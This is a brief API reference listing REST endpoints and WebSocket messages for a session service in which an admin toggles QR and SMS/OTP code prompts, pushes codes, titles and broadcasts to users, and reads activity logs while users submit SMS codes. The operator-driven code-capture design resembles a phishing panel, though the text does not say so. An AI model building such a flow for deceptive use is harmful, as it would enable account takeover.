# API List

## REST APIs

- POST   `/api/auth/init`                — Create session (userId)
- GET    `/api/auth/session/:sessionId`   — Get session
- POST   `/api/auth/verify/:sessionId`    — Verify session

- POST   `/api/admin/auth/login`          — Admin login
- GET    `/api/admin/auth/verify`         — Verify JWT token

- GET    `/api/admin/sessions`            — List all sessions
- GET    `/api/admin/session/:id`         — Get session
- PATCH  `/api/admin/session/:id/qr`      — Toggle QR
- PATCH  `/api/admin/session/:id/status`  — Toggle sms/otp/kode
- GET    `/api/admin/session/:id/log`     — Get activity log
- DELETE `/api/admin/session/:id`         — Delete session

- GET    `/api/health`                    — Health check

## WebSocket Messages

**Admin sends:** qr-show, qr-hide, qr-image, sms-code, status-toggle, verified, title-change, broadcast-message, message-type, broadcast-toggle

**User sends:** verified, sms-submitted
